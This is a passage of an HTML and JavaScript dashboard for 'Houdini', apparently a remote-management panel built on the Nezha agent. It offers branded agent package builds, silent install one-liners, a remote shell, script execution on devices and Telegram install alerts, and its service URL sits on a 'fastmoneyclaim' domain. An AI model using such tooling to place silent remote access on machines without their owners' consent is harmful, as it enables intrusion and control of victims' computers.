<button class="btn primary" type="button" onclick="build('linux','zip')" title="Build Linux ZIP package"><svg viewBox="0 0 24 24" width="15" height="15" style="vertical-align:middle;fill:currentColor"><path d="M12 0c-1.5 0-2.7 1.5-2.7 3 0 .3.1.7.2 1-.3.4-.5.9-.5 1.4 0 .5.2 1 .5 1.4l.2.6c.4.2.9.3 1.4.3.6 0 1.1-.2 1.6-.5.2-.1.5-.2.8-.2.9 0 1.6.7 1.6 1.6 0 .2 0 .4-.1.6 0 .3-.1.6-.2.9-.6 1.3-1 2.4-1.4 3.2h-.3c-1.6 0-3.2.5-4.5 1.3-.7.5-1.2 1.1-1.7 1.8-.3.4-.6.8-1 1.2 0 .1-.1.2-.2.3-.3.5-.5 1-.5 1.5 0 .5.2 1 .5 1.4.3.5.8 1 1.3 1.3.6.4 1.3.7 2 .8.6.2 1.2.3 1.8.3h5.2c.6 0 1.2-.1 1.8-.3.7-.2 1.3-.5 1.9-.9.6-.4 1.1-.9 1.4-1.5.3-.6.5-1.2.5-1.8 0-.9-.3-1.8-.9-2.5-.6-.7-1.4-1.2-2.3-1.5-.5-2.7-1.5-4.9-3.1-6.4-.8-.8-1.7-1.5-2.8-2.1-.1-1.3-1.2-2.3-2.5-2.3zm0 1c.8 0 1.5.6 1.5 1.4S12.8 3.8 12 3.8c-.8 0-1.5-.6-1.5-1.4S11.2 1 12 1zM8.5 5c.3 0 .5.2.5.5S8.8 6 8.5 6 8 5.8 8 5.5 8.2 5 8.5 5zm7 0c.3 0 .5.2.5.5s-.2.5-.5.5-.5-.2-.5-.5.2-.5.5-.5z"/></svg> Linux ZIP</button>
<button class="btn primary" type="button" onclick="build('darwin','zip')" title="Build macOS ZIP package"><svg viewBox="0 0 24 24" width="15" height="15" style="vertical-align:middle;fill:currentColor"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg> macOS ZIP</button>
<button class="btn" type="button" onclick="openPowershell()" title="Show PowerShell install script with one-liner copy"><svg viewBox="0 0 24 24" width="15" height="15" style="vertical-align:middle;fill:currentColor"><path d="M.11 1.36 9.32 5.4l-9.21 4.03v-8.07zm20.07 4.2 3.82 6.44-3.82 6.44-3.82-6.44 3.82-6.44zm-5.13.02-7.65 3.03H6.86l6.58 1.85 2.13 1.29 1.27 3.07h.03l.33-.01 1.27-3.07 2.12-1.29 6.63-1.87h-.55l-7.68-3.02zm-6.5.93 9.93 3.93-9.93 3.93z"/></svg> PowerShell script</button>
</div>
<div class="msg" id="msg"></div></div>
<div class="panel"><div class="panel-title"><h2>Recent builds</h2><button class="btn danger" type="button" onclick="clearBuilds()" title="Clear all recent builds">Clear all</button></div><div id="builds">Loading…</div></div>
<div class="install-box"><div class="hint" style="margin-bottom:8px;font-weight:700">Windows</div><pre id="installWin">Option A — Embedded EXE (recommended)
1. Build "Windows · Embedded EXE" and download the .exe
2. Run as Administrator (UAC prompt is expected)
3. Agent installs and starts with config baked in

Option B — ZIP package
1. Build "Windows · ZIP package" and extract the zip
2. Right-click install.bat → Run as administrator
3. Device appears under Dashboard → Devices within ~30s</pre></div>
<div class="install-box"><div class="hint" style="margin-bottom:8px;font-weight:700">Linux</div><pre id="installLinux">unzip houdini-linux-*.zip
sudo ./install.sh   # or run nezha-agent with the included config</pre></div>
<div class="install-box"><div class="hint" style="margin-bottom:8px;font-weight:700">Connection target</div><pre id="installTarget">Loading…</pre></div>
<div class="install-box"><div class="hint" style="margin-bottom:8px;font-weight:700">One-liner — PowerShell (Win+R)</div><pre id="installOneLiner" style="cursor:pointer;user-select:all" title="Click to select, then copy">Loading…</pre></div>
<div class="install-box"><div class="hint" style="margin-bottom:8px;font-weight:700">One-liner — Embedded EXE (silent)</div><pre id="installExeOneLiner" style="cursor:pointer;user-select:all" onclick="this.select();document.execCommand('copy')" title="Click to copy">Loading…</pre></div>
</div>
</div>


<div id="viewSystem" class="hidden native-view">
<div class="page-head"><div><h1>System</h1><div class="page-meta">Dashboard parameters from nezha.wiki</div></div>
<div class="head-actions"><button class="btn" type="button" onclick="loadSystem()">Refresh</button><button class="btn primary" type="button" onclick="saveSystem()">Save dashboard params</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="sec-grid">
<div class="panel"><div class="panel-title"><h2>Dashboard config</h2><span class="sub" id="sysMsg">—</span></div>
<div class="form-grid">
<div><label class="field">web_real_ip_header</label><input id="sys_web_real_ip_header" type="text"/></div>
<div><label class="field">agent_real_ip_header</label><input id="sys_agent_real_ip_header" type="text"/></div>
<div><label class="field">reserved_hosts</label><input id="sys_reserved_hosts" type="text"/></div>
<div><label class="field">location (timezone)</label><input id="sys_location" type="text"/></div>
<div><label class="field">jwt_timeout (hours)</label><input id="sys_jwt_timeout" type="number" min="1"/></div>
<div><label class="field">avg_ping_count</label><input id="sys_avg_ping_count" type="number" min="1"/></div>
</div>
<div class="checks" style="margin-top:12px">
<label><input id="sys_enable_mcp" type="checkbox"/> enable_mcp</label>
<label><input id="sys_enable_plain_ip" type="checkbox"/> enable_plain_ip_in_notification</label>
<label><input id="sys_enable_ip_change" type="checkbox"/> enable_ip_change_notification</label>
<label><input id="sys_debug" type="checkbox"/> debug</label>
<label><input id="sys_force_auth" type="checkbox"/> force_auth</label>
<label><input id="sys_tls" type="checkbox"/> tls (install command)</label>
</div>
<div class="form-grid" style="margin-top:12px">
<div><label class="field">ip_change_notification_group_id</label><input id="sys_ip_change_group" type="number" min="0"/></div>
<div><label class="field">cover (1=all except list, 2=only list)</label><input id="sys_cover" type="number" min="1" max="2"/></div>
<div><label class="field">ignored_ip_notification (ids)</label><input id="sys_ignored_ip" type="text"/></div>
<div><label class="field">dns_servers (comma)</label><input id="sys_dns_servers" type="text"/></div>
</div>
<div class="hint" style="margin-top:10px">Saving updates config.yaml. Restart dashboard if TSDB/MCP/listen keys change (server applies non-star keys often without restart for some fields; real-ip and mcp usually need restart).</div>
<button class="btn" type="button" style="margin-top:10px" onclick="restartDashboardHint()">How to restart dashboard</button>
</div>
<div class="panel"><div class="panel-title"><h2>Status</h2></div>
<div id="sysStatus" class="mono" style="white-space:pre-wrap;font-size:.8rem">Loading…</div>
<div class="panel-title" style="margin-top:16px"><h2>Integrations · MCP</h2></div>
<div class="install-box"><pre id="sysMcpHelp">MCP is enabled at POST /mcp with a Personal Access Token (PAT).
Create a PAT: Settings → API tokens (Nezha admin).
Scopes: inventory/server read, exec, write as needed.
Use Authorization: Bearer nzp_…
Never use browser JWT for MCP.</pre></div>
<div class="panel-title" style="margin-top:16px"><h2>Wiki recipes</h2></div>
<div class="install-box"><pre>1) Service monitor (HTTP GET)
   Target: https://rmm.houdini.fastmoneyclaim.com/login
   Interval: 60s — self-health of Houdini login.

2) Notification placeholders
   Body: #NEZHA# · Server #SERVER.NAME# · CPU #SERVER.CPU#
   Slack JSON: {"text":"#NEZHA#"}

3) IP change notify
   Create a notification group first, set group id above, then enable.

4) History charts
   TSDB path data/tsdb · retention 30d · unlocks 1d/7d/30d metrics.

5) Real IP recovery
   If locked out by WAF, set web_real_ip_header to X-Real-IP (or NZ::Use-Peer-IP) and restart.</pre></div>
</div>
</div>
</div>

<div id="viewScripts" class="hidden native-view">
<div class="page-head"><div><h1>Scripts</h1><div class="page-meta">Library of reusable remote scripts</div></div>
<div class="head-actions">
<button class="btn" type="button" onclick="loadScripts()">Refresh</button>
<button class="btn primary" type="button" onclick="saveScript()">Save script</button>
<button class="btn ghost" type="button" data-tab="devices">Back</button>
</div></div>
<div class="panel"><div class="panel-title"><h2>Editor</h2><span class="sub" id="scriptMsg">—</span></div>
<div class="form-grid"><div><label class="field">Name</label><input id="scriptName" type="text" placeholder="Restart print spooler"/></div>
<div><label class="field">Shell</label><select id="scriptShell" class="input" style="width:100%"><option value="bash">bash / sh</option><option value="powershell">PowerShell</option><option value="cmd">cmd</option></select></div></div>
<input type="hidden" id="scriptId"/>
<div style="margin-top:12px"><label class="field">Script content</label><textarea id="scriptContent" style="min-height:180px;font-family:ui-monospace,monospace"></textarea></div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:12px">
<button class="btn" type="button" onclick="newScript()">New</button>
<button class="btn primary" type="button" onclick="saveScript()">Save</button>
<button class="btn danger" type="button" onclick="deleteScript()">Delete</button>
</div>
<div style="margin-top:16px"><label class="field">Run on device IDs (comma-separated)</label>
<div style="display:flex;gap:8px;flex-wrap:wrap"><input id="scriptTargets" type="text" placeholder="1,2,3" style="flex:1;min-width:180px"/>
<button class="btn primary" type="button" onclick="runScript()">Run on devices</button></div>
<div class="hint" style="margin-top:6px">Creates a one-shot task on selected agents.</div>
</div></div>
<div class="panel"><div class="panel-title"><h2>Library</h2></div><div class="table-wrap" id="scriptList"><div class="empty">Loading…</div></div></div>
</div>

<div id="viewAudit" class="hidden native-view">
<div class="page-head"><div><h1>Audit log</h1><div class="page-meta">Uninstalls, script runs, security changes</div></div>
<div class="head-actions"><button class="btn" type="button" onclick="loadAudit()">Refresh</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="panel"><div class="panel-title"><h2>Events</h2><span class="sub" id="auditMsg">—</span></div><div class="table-wrap" id="auditList"><div class="empty">Loading…</div></div></div>
</div>

<div id="viewSecurity" class="hidden native-view">
<div class="page-head"><div><h1>Security</h1><div class="page-meta">2FA (TOTP) and simple role map</div></div>
<div class="head-actions"><button class="btn" type="button" onclick="loadSecurity()">Refresh</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="sec-grid">
<div class="panel"><div class="panel-title"><h2>Two-factor authentication</h2><span class="sub" id="secTotpState">—</span></div>
<div class="hint">Authenticator apps. Enforced on the Houdini sign-in page after password succeeds.</div>
<div style="margin-top:12px" id="totpSetupBox" class="hidden">
<div class="install-box"><div class="hint" style="font-weight:700;margin-bottom:6px">Secret</div><pre id="totpSecret" class="mono"></pre></div>
<div class="install-box"><div class="hint" style="font-weight:700;margin-bottom:6px">Provisioning URI</div><pre id="totpUri" class="mono" style="font-size:.72rem"></pre></div>
<label class="field" style="margin-top:10px">Confirm code</label>
<input id="totpConfirm" type="text" inputmode="numeric" autocomplete="one-time-code" placeholder="123456"/>
<button class="btn primary" type="button" style="margin-top:10px" onclick="enableTotp()">Enable 2FA</button>
</div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:14px">
<button class="btn primary" type="button" onclick="beginTotp()">Set up / rotate 2FA</button>
<button class="btn danger" type="button" onclick="disableTotp()">Disable 2FA</button>
</div>
<div class="msg" id="secMsg" style="margin-top:10px"></div>
</div>
<div class="panel" data-admin="1"><div class="panel-title"><h2>Roles</h2><span class="sub">username → admin | tech | readonly</span></div>
<textarea id="rolesJson" style="min-height:160px;font-family:ui-monospace,monospace"></textarea>
<div class="hint" style="margin-top:8px">Example: {"admin":"admin","helpdesk":"tech","viewer":"readonly"}</div>
<button class="btn" type="button" style="margin-top:10px" onclick="saveRoles()">Save roles</button>
</div>
</div>
</div>


<div id="viewTelegram" class="hidden native-view">
<div class="page-head"><div><h1>Telegram alerts</h1><div class="page-meta">Bot token + chat ID · online / offline device alerts</div></div>
<div class="head-actions"><button class="btn" type="button" onclick="loadTg()">Refresh</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="sec-grid">
<div class="panel"><div class="panel-title"><h2>Bot credentials</h2><span class="sub" id="tgMsg">—</span></div>
<div class="form-grid">
<div><label class="field">Bot token (from @BotFather)</label><input id="tgBotToken" type="password" autocomplete="off" placeholder="123456:ABC-DEF..."/></div>
<div><label class="field">Chat / channel ID</label><input id="tgChatId" type="text" placeholder="123456789 or -1001234567890"/></div>
</div>
<div class="checks" style="margin-top:12px"><label><input id="tgMonitor" type="checkbox" checked/> Notify on device online / offline</label></div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:14px">
<button class="btn primary" type="button" onclick="saveTg()">Save</button>
<button class="btn" type="button" onclick="testTg()">Send test message</button>
<button class="btn" type="button" onclick="testAlert()">Test in-browser alert</button>
</div>
<div class="msg" id="tgResult" style="margin-top:10px"></div>
</div>
<div class="panel"><div class="panel-title"><h2>How it works</h2></div>
<div class="install-box"><pre>1. Send /newbot to @BotFather on Telegram to create a bot, copy the token.
2. Message your bot, then open https://api.telegram.org/botYOUR_TOKEN/getUpdates
   and copy the numeric chat id from "chat":{"id":...}.
3. Paste both here, press Save, then "Send test message".

WHAT GETS REPORTED
• Every device ONLINE / OFFLINE transition (checked every 30s)
• New devices when they first appear in the panel
• Devices removed from the panel
• Uninstall / script-run actions from the dashboard
• In-browser alerts (top-right) whenever a device installs / connects
  or drops offline — no Telegram needed, shown live on this page.

BUILT PACKAGES
When Telegram is configured here, every package you build (ZIP for
Windows/Linux) embeds tg-report helpers so install/uninstall report
to this chat, and the "PowerShell installer script" reports every
phase of the clean reinstall (install / start / fail / success).</pre></div>
</div>
</div>
</div>


<div id="viewTerminal" class="hidden native-view">
<div class="page-head"><div><h1 id="termTitle">Terminal</h1><div class="page-meta" id="termMeta">Remote shell</div></div>
<div class="head-actions">
<button class="btn" type="button" id="btnTermReconnect">Reconnect</button>
<button class="btn ghost" type="button" data-tab="devices">Back to devices</button>
</div></div>
<div class="term-status" id="termStatus">Idle</div>
<div class="term-wrap"><div id="termBox"></div></div>
</div>

<div id="viewManager" class="hidden native-view">
<div class="page-head"><div><h1 id="mgrTitle">Manager</h1><div class="page-meta" id="mgrMeta">Resource</div></div>
<div class="head-actions">
<button class="btn primary" type="button" id="btnMgrNew">New</button>
<button class="btn" type="button" id="btnMgrRefresh">Refresh</button>
<button class="btn ghost" type="button" data-tab="devices">Back</button>
</div></div>
<div class="panel"><div class="panel-title"><div><h2>Records</h2><div class="hint" style="margin-top:4px" id="mgrHint"></div></div><span class="sub" id="mgrCount">&mdash;</span></div>
<div id="mgrTable"><div class="empty">Loading&hellip;</div></div>
</div>
</div>

<div id="viewFiles" class="hidden native-view">
<div class="page-head"><div><h1>File Manager</h1><div class="page-meta">Uploaded files — MSI installers, scripts, tools</div></div>
<div class="head-actions"><button class="btn" type="button" onclick="loadFiles()">Refresh</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="panel"><div class="panel-title"><h2>Files</h2><span class="sub" id="filesMsg">—</span></div>
<div id="filesTable"><div class="empty">Loading…</div></div></div>
</div>

<div id="viewSettings" class="hidden native-view">
<div class="page-head"><div><h1>Settings</h1><div class="page-meta">Dashboard configuration</div></div>
<div class="head-actions"><button class="btn" type="button" onclick="loadSettings()">Refresh</button><button class="btn primary" type="button" id="btnSaveSettings">Save</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="panel" data-admin="1" id="adminFeaturesPanel"><div class="panel-title"><div><h2>Admin Features</h2><div class="hint" style="margin-top:4px">Toggle optional admin-only features</div></div></div>
<div style="padding:8px 0">
<label style="display:flex;align-items:center;gap:10px;cursor:pointer;font-size:.875rem;padding:6px 0">
<input type="checkbox" id="cfgShowUserDevices" onchange="saveAdminCfg()"/>
<span>Show "User Devices" tab in sidebar</span>
</label>
<div class="hint" style="margin-left:26px;margin-top:2px">When enabled, a "User Devices" tab appears in the admin sidebar showing all devices installed by non-admin users, tagged with the owner's name.</div>
</div>
</div>
<div class="panel" data-admin="1"><div class="panel-title"><div><h2>Management</h2><div class="hint" style="margin-top:4px">Admin-only tools &mdash; click to open</div></div></div>
<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;padding:4px">
<button class="btn" type="button" onclick="showTab('service')" style="text-align:left">Service</button>
<button class="btn" type="button" onclick="showTab('task')" style="text-align:left">Task</button>
<button class="btn" type="button" onclick="showTab('notification')" style="text-align:left">Notification</button>
<button class="btn" type="button" onclick="showTab('alert')" style="text-align:left">Alert Rule</button>
<button class="btn" type="button" onclick="showTab('ddns')" style="text-align:left">DDNS</button>
<button class="btn" type="button" onclick="showTab('nat')" style="text-align:left">NAT</button>
<button class="btn" type="button" onclick="showTab('serverGroup')" style="text-align:left">Server Group</button>
<button class="btn" type="button" onclick="showTab('notifGroup')" style="text-align:left">Notif Group</button>
<button class="btn" type="button" onclick="showTab('transfer')" style="text-align:left">Transfer</button>
</div>
</div>
<div class="panel"><div class="panel-title"><div><h2>General</h2><div class="hint" style="margin-top:4px">Core dashboard settings &mdash; some keys apply after a dashboard restart</div></div><span class="sub" id="settingsMsg">&mdash;</span></div>
<form id="formSettings" onsubmit="return false"><div class="empty">Loading&hellip;</div></form>
</div>
</div>

<div id="viewProfile" class="hidden native-view">
<div class="page-head"><div><h1>Profile</h1><div class="page-meta">My account</div></div><div class="head-actions"><button class="btn" type="button" onclick="loadProfile()">Refresh</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div id="profileInfo"><div class="empty">Loading&hellip;</div></div>
</div>
<div id="viewUserDevices" class="hidden native-view">
<div class="page-head"><div><h1>User Devices</h1><div class="page-meta">All devices installed by non-admin users</div></div><div class="head-actions"><button class="btn" type="button" onclick="loadUserDevices()">Refresh</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="panel"><div class="panel-title"><div><h2>Devices</h2><div class="hint" style="margin-top:4px">Owner name shown as tag on each device</div></div><span class="sub" id="udMsg">&mdash;</span></div>
<div class="device-list" id="udGrid"><div class="empty">Loading&hellip;</div></div></div>
</div>

<div id="viewUsers" class="hidden native-view">
<div class="page-head"><div><h1>Users</h1><div class="page-meta">Dashboard accounts and access control</div></div><div class="head-actions"><button class="btn" type="button" onclick="openUsers()">Refresh</button><button class="btn primary" type="button" onclick="createUserModal()">New user</button><button class="btn ghost" type="button" data-tab="devices">Back</button></div></div>
<div class="panel"><div class="panel-title"><div><h2>Accounts</h2><div class="hint" style="margin-top:4px">Admins can manage all dashboard settings and users</div></div><span class="sub" id="usersMsg">&mdash;</span></div><div id="usersGrid"><div class="empty">Loading&hellip;</div></div></div>
</div>



<div id="toastWrap"></div>
</div></div></div>
<script>

﻿const BASE = '/dashboard/';
function apiUrl(path){ return BASE + path.replace(/^\//,''); }
async function api(path, opts={}){
  const headers = Object.assign({'Content-Type':'application/json'}, opts.headers||{});
  return fetch(apiUrl(path), Object.assign({}, opts, { headers, credentials: 'include' }));
}
function $(id){ return document.getElementById(id); }
const viewDevices = $('viewDevices');
const viewPackages = $('viewPackages');
const viewFrame = $('viewFrame');
const viewManager = $('viewManager');
const viewSettings = $('viewSettings');
const viewProfile = $('viewProfile');
const frameTitle = $('frameTitle');
const frameMeta = $('frameMeta');
const frameLoading = $('frameLoading');
const devGrid = $('devGrid');
const devMsg = $('devMsg');
const mTotal = $('mTotal');
const mOnline = $('mOnline');
const mOffline = $('mOffline');
const mNet = $('mNet');
const mRate = $('mRate');
const liveTitle = $('liveTitle');
const liveSub = $('liveSub');
const notifFeed = $('notifFeed');
const activityFeed = $('activityFeed');
const clockLine = $('clockLine');
const builds = $('builds');
const msg = $('msg');
const iconPreview = $('iconPreview');
const product_name = $('product_name');
const company = $('company');
const description = $('description');
const website = $('website');
const icon = $('icon');
const server = $('server');
const client_secret = $('client_secret');
const tls = $('tls');
const disable_command_execute = $('disable_command_execute');
const disable_nat = $('disable_nat');
const NATIVE_VIEWS = {devices:1, packages:1, scripts:1, files:1, audit:1, security:1, system:1, telegram:1, terminal:1};
// Resource metadata for the generic native manager
const MGR_META = {
  service: { title:'Service', meta:'Service monitoring endpoints', api:'service', cols:[['name','Name'],['target','Target'],['interval','Interval']] },
  task: { title:'Task', meta:'Scheduled cron tasks', api:'task', cols:[['name','Name'],['scheduler','Schedule'],['command','Command']] },
  notification: { title:'Notification', meta:'Notification channels', api:'notification', cols:[['name','Name'],['url','URL']] },
  alert: { title:'Alert Rule', meta:'Alert thresholds', api:'alert', cols:[['name','Name'],['enable','Enabled']] },
  ddns: { title:'DDNS', meta:'Dynamic DNS records', api:'ddns', cols:[['name','Name'],['provider','Provider'],['domain','Domain']] },
  nat: { title:'NAT', meta:'NAT rules', api:'nat', cols:[['name','Name'],['host','Host']] },
  serverGroup: { title:'Server Group', meta:'Server groups', api:'servergroup', cols:[['name','Name'],['servers','Servers','count']] },
  notifGroup: { title:'Notif Group', meta:'Notification groups', api:'notifgroup', cols:[['name','Name'],['notifications','Notifications','count']] },
  transfer: { title:'Transfer', meta:'Per-server traffic usage (auto-collected)', api:'transfer', ro:1, cols:[['server_id','Server'],['in','Bytes In','bytes'],['out','Bytes Out','bytes']] }
};
const NAV_IDS = {
  devices:'navDevices', packages:'navPackages', scripts:'navScripts', audit:'navAudit',
  security:'navSecurity', system:'navSystem',
  service:'navService', task:'navTask',
  notification:'navNotification', alert:'navAlert', ddns:'navDdns', nat:'navNat',
  serverGroup:'navServerGroup', notifGroup:'navNotifGroup', transfer:'navTransfer',
  settings:'navSettings', profile:'navProfile', telegram:'navTelegram', users:'navUsers'
};
let currentUsername = '';
let userClaimToken = ''; // claim token for non-admin users' one-liners
let currentTab = 'devices';
let terminalId = null;
let currentRole = null; // 0=admin, 1=user
async function requireAuth(){
  try {
    const r = await fetch('/api/v1/profile', { credentials: 'include' });
    if (!r.ok) throw new Error('unauthorized');
    const j = await r.json().catch(()=>({}));
    if (j && j.error) throw new Error(j.error);
    if (j && j.success === false) throw new Error(j.message || 'unauthorized');
    if (j && j.success !== true && !(j.data && (j.data.username || j.data.id != null))) {
      throw new Error('unauthorized');
    }
    return true;
  } catch (e) {
    const next = encodeURIComponent(location.pathname + location.search + location.hash);
    location.href = '/login?next=' + next;
    return false;
  }
}
function setActiveNav(name){
  Object.keys(NAV_IDS).forEach(function(k){
    const el = $(NAV_IDS[k]);
    if (el) el.classList.toggle('active', k === name);
  });
}
function showNative(name){
  const map = {
    devices: 'viewDevices', packages: 'viewPackages', scripts: 'viewScripts', files: 'viewFiles',
    audit: 'viewAudit', security: 'viewSecurity', system: 'viewSystem', telegram: 'viewTelegram', terminal: 'viewTerminal',
    settings: 'viewSettings', profile: 'viewProfile', users: 'viewUsers', userdevices: 'viewUserDevices'
  };
  Object.keys(map).forEach(function(k){
    const el = document.getElementById(map[k]);
    if (el) el.classList.toggle('hidden', k !== name);
  });
  if (viewFrame) viewFrame.classList.add('hidden');
  if (viewManager) viewManager.classList.add('hidden');
}
function mgrRowCell(v){
  if (v === null || v === undefined) return '';
  if (typeof v === 'boolean') return v ? 'Yes' : 'No';
  if (typeof v === 'object') { try { return JSON.stringify(v); } catch(e){ return String(v); } }
  return String(v);
}
async function openManager(name){
  stopTerminal();
  const meta = MGR_META[name];
  if (!meta) return;
  _curManager = name;
  currentTab = name;
  setActiveNav(name);
  ['viewDevices','viewPackages','viewScripts','viewFiles','viewAudit','viewSecurity','viewSystem','viewTelegram','viewTerminal','viewSettings','viewProfile','viewUsers','viewUserDevices'].forEach(function(id){
    const el = document.getElementById(id);
    if (el) el.classList.add('hidden');
  });
  if (viewFrame) viewFrame.classList.add('hidden');
  if (viewManager) viewManager.classList.remove('hidden');
  const mt = document.getElementById('mgrTitle'); if (mt) mt.textContent = meta.title;
  const mm = document.getElementById('mgrMeta'); if (mm) mm.textContent = meta.meta;
  const mh = document.getElementById('mgrHint'); if (mh) mh.textContent = meta.meta;
  const bn = document.getElementById('btnMgrNew'); if (bn) bn.style.display = meta.ro ? 'none' : '';
  await loadManager(name);
}
function fmtBytes(n){
  n = Number(n) || 0;
  if (n >= 1099511627776) return (n/1099511627776).toFixed(1) + ' TB';
  if (n >= 1073741824) return (n/1073741824).toFixed(1) + ' GB';
  if (n >= 1048576) return (n/1048576).toFixed(1) + ' MB';
  if (n >= 1024) return (n/1024).toFixed(1) + ' KB';
  return n + ' B';
}
async function loadManager(name){
  const meta = MGR_META[name];
  if (!meta) return;
  const tb = $('mgrTable');
  const mc = document.getElementById('mgrCount');
  if (tb) tb.innerHTML = '<div class="empty">Loading\u2026</div>';
  let items = [];
  try {
    const r = await api('api/nx/' + meta.api);
    const j = await r.json();
    if (j && Array.isArray(j.data)) items = j.data; else if (j && Array.isArray(j)) items = j; else items = [];
  } catch(e) { items = []; }
  if (mc) mc.textContent = items.length + (items.length === 1 ? ' record' : ' records');
  if (!items.length) { if (tb) tb.innerHTML = '<div class="empty">No ' + escapeHtml(meta.title) + ' records yet</div>'; return; }
  let html = '<div class="tbl-wrap"><table class="mgr-tbl"><thead><tr><th>' + meta.cols.map(function(c){return c[1];}).join('</th><th>') + '</th>' + (meta.ro ? '' : '<th style="text-align:right">Actions</th>') + '</tr></thead><tbody>';
  items.forEach(function(it){
    html += '<tr>';
    meta.cols.forEach(function(c){
      const raw = it[c[0]];
      const v = c[2] === 'bytes' ? fmtBytes(raw) : c[2] === 'count' ? (Array.isArray(raw) ? String(raw.length) : '0') : mgManagerCell(raw);
      html += '<td title="' + escapeHtml(mgManagerCell(raw)) + '">' + escapeHtml(v) + '</td>';
    });
    if (!meta.ro) {
      html += '<td class="row-actions">'
        + '<button class="btn small" type="button" onclick="mgrEdit(\'' + name + '\',' + (it.id != null ? it.id : 'null') + ',\'' + escapeJs(JSON.stringify(it)) + '\')">Edit</button>'
        + '<button class="btn small danger" type="button" onclick="mgrDel(\'' + name + '\',' + (it.id != null ? it.id : 'null') + ')">Delete</button>'
        + '</td>';
    }
    html += '</tr>';
  });
  html += '</tbody></table></div>';
  if (tb) tb.innerHTML = html;
}
function mgManagerCell(v){
  if (v === null || v === undefined) return '';
  if (typeof v === 'boolean') return v ? 'Yes' : 'No';
  if (Array.isArray(v)) { try { return JSON.stringify(v); } catch(e){} return ''; }
  if (typeof v === 'object') { try { return JSON.stringify(v); } catch(e){} return ''; }
  return String(v);
}
function escapeJs(s){ return String(s || '').replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\n/g,'\\n'); }
function mgrDel(name, id){
  const meta = MGR_META[name];
  confirmModal({ title:'Delete '+meta.title, body:'Delete this '+meta.title+' record?', okText:'Delete', danger:true }).then(function(ok){
    if (!ok) return;
    api('/api/nx/' + meta.api + '/' + id + '/delete', { method:'POST' }).then(function(r){
      return r.json().catch(()=>({}));
    }).then(function(j){
      if (j && j.ok) loadManager(name);
      else alertModal({ title:'Error', body:(j && j.error) || 'Delete failed' });
    });
  });
}
function mgrEdit(name, id, jsonStr){
  const meta = MGR_META[name];
  let obj = {};
  try { obj = JSON.parse(jsonStr); } catch(e){}
  promptModal({ title:'Edit '+meta.title, okText:'Save',
    fields:[{ key:'record', label:'Record (JSON)', value: JSON.stringify(obj, null, 2) }] }).then(function(res){
    if (!res) return;
    let out; try { out = JSON.parse(res.record); } catch(e){ alertModal({title:'Error', body:'Invalid JSON'}); return; }
    api('/api/nx/' + meta.api + '/' + id, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(out) })
      .then(r => r.json()).then(j => {
        if (j && j.ok) loadManager(name); else alertModal({ title:'Error', body:(j && j.error) || 'Save failed' });
      }).catch(e => alertModal({ title:'Error', body:String(e) }));
  });
}
function mgrNew(name){
  const meta = MGR_META[name];
  promptModal({ title:'New '+meta.title, okText:'Create',
    fields:[{ key:'name', label:'Name', value:'' }, { key:'record', label:'Extra fields (JSON)', value:'{}' }] }).then(function(res){
    if (!res) return;
    let out = {};
    if (res.name) out.name = res.name;
    if (res.record && res.record.trim()) { try { Object.assign(out, JSON.parse(res.record)); } catch(e){ alertModal('Error','Invalid JSON'); return; } }
    api('/api/nx/' + meta.api + '/create', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(out) })
      .then(r => r.json()).then(j => {
        if (j && j.ok) loadManager(name); else alertModal({ title:'Error', body:(j && j.error) || 'Create failed' });
      }).catch(e => alertModal({title:'Error', body:String(e)}));
  });
}
function showTab(name, opts){
  opts = opts || {};
  name = String(name || 'devices').replace(/^#\/?/, '');
  if (name === 'terminal') {
    currentTab = 'terminal';
    setActiveNav('devices');
    showNative('terminal');
    startTerminal(terminalId, !!opts.force);
  } else if (name === 'settings') {
    stopTerminal(); currentTab = 'settings'; terminalId = null; setActiveNav('settings'); showNative('settings'); loadSettings();
  } else if (name === 'profile') {
    stopTerminal(); currentTab = 'profile'; terminalId = null; setActiveNav('profile'); showNative('profile'); loadProfile();
  } else if (name === 'users') {
    stopTerminal(); currentTab = 'users'; terminalId = null; setActiveNav('users'); showNative('users'); openUsers();
  } else if (MGR_META[name]) {
    stopTerminal(); terminalId = null; openManager(name);
  } else if (NATIVE_VIEWS[name]) {
    stopTerminal();
    currentTab = name; terminalId = null; setActiveNav(name); showNative(name);
    if (name === 'devices') loadDevices();
    if (name === 'packages') initPackages();
    if (name === 'scripts') loadScripts();
    if (name === 'files') loadFiles();
    if (name === 'audit') loadAudit();
    if (name === 'security') loadSecurity();
    if (name === 'system') loadSystem();
    if (name === 'telegram') loadTg();
  } else {
    stopTerminal();
    currentTab = 'devices'; setActiveNav('devices'); showNative('devices'); loadDevices(); name = 'devices';
  }
  try {
    const hash = name === 'terminal' && terminalId != null ? '#/terminal/' + terminalId : '#/' + name;
    history.replaceState(null, '', '/dashboard/' + hash);
  } catch (e) {}
}

// ---- Native Planix terminal (Nezha /api/v1/terminal + /api/v1/ws/terminal) ----
let _term = null;
let _fit = null;
let _termWs = null;
let _termServerId = null;
let _termSessionId = null;
let _termRo = null;

function getCookie(name){
  const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()[\]\\/+^])/g,'\\$1') + '=([^;]*)'));
